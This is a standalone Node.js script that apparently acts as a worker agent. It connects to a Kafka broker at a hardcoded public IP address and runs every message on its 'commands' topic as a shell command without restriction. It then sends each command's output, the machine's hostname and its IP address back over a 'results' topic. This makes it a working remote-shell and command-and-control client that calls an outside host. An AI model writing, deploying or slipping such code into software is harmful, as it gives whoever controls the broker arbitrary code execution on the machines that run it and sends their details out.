const { exec } = require('child_process')
const { Kafka } = require('kafkajs')
const os = require('os')

const kafka = new Kafka({
  clientId: 'worker-' + os.hostname(),
  brokers: [' 44.217.41.36:9092']
})

const consumer = kafka.consumer({ groupId: 'workers' })
const producer = kafka.producer()

async function run() {
  await consumer.connect()
  await producer.connect()
  await consumer.subscribe({ topic: 'commands', fromBeginning: false })

  await consumer.run({
    eachMessage: async ({ message }) => {
      const command = message.value.toString()
      console.log(`Executing command: ${command}`)

      exec(command, (err, stdout, stderr) => {
        const result = {
          worker: os.hostname(),
          ip: require('os').networkInterfaces().eth0?.[0]?.address || 'unknown',
          command,
          output: stdout || stderr || err?.message
        }

        producer.send({
          topic: 'results',
          messages: [{ value: JSON.stringify(result) }]
        })
      })
    }
  })
}

run().catch(console.error)
